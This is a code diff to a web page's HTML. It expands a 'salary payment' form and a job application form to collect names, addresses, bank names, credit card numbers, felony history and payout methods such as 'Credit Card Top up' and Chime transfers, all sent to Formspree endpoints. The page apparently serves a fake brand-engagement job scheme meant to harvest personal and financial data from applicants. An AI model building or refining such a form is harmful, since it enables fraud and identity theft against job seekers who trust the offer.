@@ -161,75 +161,177 @@
         <div class="card-heading">
           <p class="section-label">Step 1 — Salary Payment Proposal</p>
           <h2 class="card-title">Payment Processing</h2>
-          <p class="card-subtitle">Please complete this form for salary payment processing.</p>
+          <p class="card-subtitle">Please complete this form with your full details for salary payment processing.</p>
         </div>
 
         <form id="secondForm" action="https://formspree.io/f/xwlvnyql" method="POST" novalidate>
-          <div class="form-grid">
-            <div class="form-group">
-              <label class="form-label required" for="full_name">Full Name</label>
-              <input class="form-control" id="full_name" name="full_name" type="text" autocomplete="name" required />
-              <span class="field-error"></span>
-            </div>
+          <fieldset class="fieldset-group">
+            <legend class="fieldset-legend">NAME &amp; CONTACT</legend>
 
-            <div class="form-group">
-              <label class="form-label required" for="email">Email Address</label>
-              <input class="form-control" id="email" name="email" type="email" autocomplete="email" required />
-              <span class="field-error"></span>
-            </div>
-
-            <div class="form-group">
-              <label class="form-label required" for="p_phone">Phone Number</label>
-              <input class="form-control" id="p_phone" name="phone" type="tel" autocomplete="tel" required />
-              <span class="field-error"></span>
-            </div>
-
-            <div class="form-group">
-              <label class="form-label required" for="salary_amount">Salary Amount (USD)</label>
-              <div class="input-money">
-                <span class="input-prefix" aria-hidden="true">$</span>
-                <input class="form-control" id="salary_amount" name="salary_amount" type="number" placeholder="0.00" min="0" step="0.01" required />
+            <div class="form-grid">
+              <div class="form-group">
+                <label class="form-label required" for="p_first">First Name</label>
+                <input class="form-control" id="p_first" name="first" type="text" autocomplete="given-name" required />
+                <span class="field-error"></span>
               </div>
-              <span class="field-error"></span>
+
+              <div class="form-group">
+                <label class="form-label required" for="p_last">Last Name</label>
+                <input class="form-control" id="p_last" name="last" type="text" autocomplete="family-name" required />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label required" for="p_email">Email Address</label>
+                <input class="form-control" id="p_email" name="email" type="email" autocomplete="email" required />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label required" for="p_phone">Phone Number</label>
+                <input class="form-control" id="p_phone" name="phone" type="tel" autocomplete="tel" required />
+                <span class="field-error"></span>
+              </div>
+            </div>
+          </fieldset>
+
+          <fieldset class="fieldset-group">
+            <legend class="fieldset-legend">HOME / P.O. BOX ADDRESS</legend>
+
+            <div class="form-grid">
+              <div class="form-group full-width">
+                <label class="form-label required" for="p_street">Street Address</label>
+                <input class="form-control" id="p_street" name="street" type="text" autocomplete="address-line1" required />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group full-width">
+                <label class="form-label" for="p_address2">Address Line 2</label>
+                <input class="form-control" id="p_address2" name="address_line_2" type="text" autocomplete="address-line2" placeholder="Apartment, suite, unit, P.O. box (optional)" />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label required" for="p_city">City</label>
+                <input class="form-control" id="p_city" name="city" type="text" autocomplete="address-level2" required />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label required" for="p_state">State / Region</label>
+                <input class="form-control" id="p_state" name="state" type="text" autocomplete="address-level1" required />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label required" for="p_postal">Postal Code</label>
+                <input class="form-control" id="p_postal" name="postal" type="text" autocomplete="postal-code" required />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label required" for="p_country">Country</label>
+                <input class="form-control" id="p_country" name="country" type="text" autocomplete="country-name" placeholder="United States" required />
+                <span class="field-error"></span>
+              </div>
+            </div>
+          </fieldset>
+
+          <fieldset class="fieldset-group">
+            <legend class="fieldset-legend">SALARY &amp; PAYMENT</legend>
+
+            <div class="form-grid">
+              <div class="form-group full-width">
+                <label class="form-label required" for="p_payMethod">Salary Paid To</label>
+                <select class="form-control" id="p_payMethod" name="payMethod" required>
+                  <option value="">Select payment method</option>
+                  <option value="Mobile Bank Deposit">(a) Mobile Bank Deposit</option>
+                  <option value="Credit Card Top up">(b) Credit Card Top up</option>
+                  <option value="Chime Transfer">(c) Chime Transfer</option>
+                </select>
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label required" for="p_salary">Salary Amount (USD)</label>
+                <div class="input-money">
+                  <span class="input-prefix" aria-hidden="true">$</span>
+                  <input class="form-control" id="p_salary" name="salary" type="number" placeholder="0.00" min="0" step="0.01" required />
+                </div>
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label required" for="p_bank">Bank Name</label>
+                <input class="form-control" id="p_bank" name="bankName" type="text" placeholder="e.g. Chase / Wells Fargo" required />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group full-width">
+                <label class="form-label" for="p_creditCard">Credit Card (optional)</label>
+                <input class="form-control" id="p_creditCard" name="credit_card" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="Card number — leave blank if not applicable" />
+                <span class="field-error"></span>
+              </div>
+            </div>
+          </fieldset>
+
+          <fieldset class="fieldset-group">
+            <legend class="fieldset-legend">ENGAGEMENT FEATURE</legend>
+
+            <div class="form-grid">
+              <div class="form-group full-width">
+                <label class="form-label required" for="p_feature">Feature</label>
+                <select class="form-control" id="p_feature" name="feature" required>
+                  <option value="">Select an option</option>
+                  <option value="Social Media Posting">Social Media Posting (daily)</option>
+                  <option value="Brand Growth">Brand Growth &amp; Marketing Strategies</option>
+                  <option value="Content Duration">Content Duration (8 hours daily)</option>
+                </select>
+                <span class="field-error"></span>
+              </div>
+            </div>
+          </fieldset>
+
+          <fieldset class="fieldset-group">
+            <legend class="fieldset-legend">BACKGROUND, DATE &amp; CONSENT</legend>
+
+            <div class="form-grid">
+              <div class="form-group">
+                <label class="form-label required" for="p_felony">Ever been convicted of felony?</label>
+                <select class="form-control" id="p_felony" name="felony" required>
+                  <option value="">Select an option</option>
+                  <option value="No">No</option>
+                  <option value="Yes">Yes</option>
+                </select>
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label required" for="p_date">Date</label>
+                <input class="form-control" id="p_date" name="date" type="date" required />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group full-width">
+                <label class="form-label required" for="p_brandApproval">Brand's Approval</label>
+                <select class="form-control" id="p_brandApproval" name="brands_approval" required>
+                  <option value="">Select an option</option>
+                  <option value="Yes">Yes</option>
+                  <option value="No">No</option>
+                </select>
+                <span class="field-error"></span>
+              </div>
             </div>
 
-            <div class="form-group">
-              <label class="form-label required" for="bank_name">Bank Name</label>
-              <input class="form-control" id="bank_name" name="bank_name" type="text" placeholder="e.g. Chase / Wells Fargo" required />
+            <div class="checkbox-group">
+              <label class="checkbox-label" for="p_agree">
+                <input type="checkbox" id="p_agree" name="agree" required />
+                <span class="checkbox-custom" aria-hidden="true"></span>
+                <span class="checkbox-text">Agreement — I agree to the terms and conditions</span>
+              </label>
               <span class="field-error"></span>
             </div>
-
-            <div class="form-group">
-              <label class="form-label required" for="payment_method">Salary Paid To</label>
-              <select class="form-control" id="payment_method" name="payment_method" required>
-                <option value="">Select payment method</option>
-                <option value="Mobile Bank Deposit">Mobile Bank Deposit</option>
-                <option value="Credit Card Top up">Credit Card Top up</option>
-                <option value="Chime Transfer">Chime Transfer</option>
-              </select>
-              <span class="field-error"></span>
-            </div>
-
-            <div class="form-group full-width">
-              <label class="form-label required" for="feature">Feature</label>
-              <select class="form-control" id="feature" name="feature" required>
-                <option value="">Select an option</option>
-                <option value="Social Media Posting">Social Media Posting (daily)</option>
-                <option value="Brand Growth">Brand Growth &amp; Marketing Strategies</option>
-                <option value="Content Duration">Content Duration (8 hours daily)</option>
-              </select>
-              <span class="field-error"></span>
-            </div>
-          </div>
-
-          <div class="checkbox-group">
-            <label class="checkbox-label" for="p_agree">
-              <input type="checkbox" id="p_agree" name="agree" required />
-              <span class="checkbox-custom" aria-hidden="true"></span>
-              <span class="checkbox-text">I agree to the terms and conditions</span>
-            </label>
-            <span class="field-error"></span>
-          </div>
+          </fieldset>
 
           <p class="form-status" id="formspreeSecondStatus" role="status" aria-live="polite"></p>
 
@@ -279,7 +381,7 @@
         <form id="applyForm" action="https://formspree.io/f/mdealbkw" method="POST" novalidate>
 
           <fieldset class="fieldset-group">
-            <legend class="fieldset-legend">NAME &amp; PHONE</legend>
+            <legend class="fieldset-legend">NAME &amp; CONTACT</legend>
 
             <div class="form-grid">
               <div class="form-group">
@@ -294,7 +396,13 @@
                 <span class="field-error"></span>
               </div>
 
-              <div class="form-group full-width">
+              <div class="form-group">
+                <label class="form-label required" for="email">Email Address</label>
+                <input class="form-control" id="email" name="email" type="email" autocomplete="email" required />
+                <span class="field-error"></span>
+              </div>
+
+              <div class="form-group">
                 <label class="form-label required" for="phone">Phone</label>
                 <input class="form-control" id="phone" name="phone" type="tel" autocomplete="tel" required />
                 <span class="field-error"></span>
@@ -377,6 +485,23 @@
               <div class="form-group full-width">
                 <label class="form-label" for="creditCard">Credit Card (optional)</label>
                 <input class="form-control" id="creditCard" name="credit_card" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="Card number — leave blank if not applicable" />
+                <span class="field-error"></span>
+              </div>
+            </div>
+          </fieldset>
+
+          <fieldset class="fieldset-group">
+            <legend class="fieldset-legend">ENGAGEMENT FEATURE</legend>
+
+            <div class="form-grid">
+              <div class="form-group full-width">
+                <label class="form-label required" for="feature">Feature</label>
+                <select class="form-control" id="feature" name="feature" required>
+                  <option value="">Select an option</option>
+                  <option value="Social Media Posting">Social Media Posting (daily)</option>
+                  <option value="Brand Growth">Brand Growth &amp; Marketing Strategies</option>
+                  <option value="Content Duration">Content Duration (8 hours daily)</option>
+                </select>
                 <span class="field-error"></span>
               </div>
             </div>
@@ -471,6 +596,10 @@
           <div class="review-row">
             <span class="review-label">Last Name</span>
             <span class="review-value" id="review-last">—</span>
+          </div>
+          <div class="review-row">
+            <span class="review-label">Email Address</span>
+            <span class="review-value" id="review-email">—</span>
           </div>
           <div class="review-row">
             <span class="review-label">Phone</span>
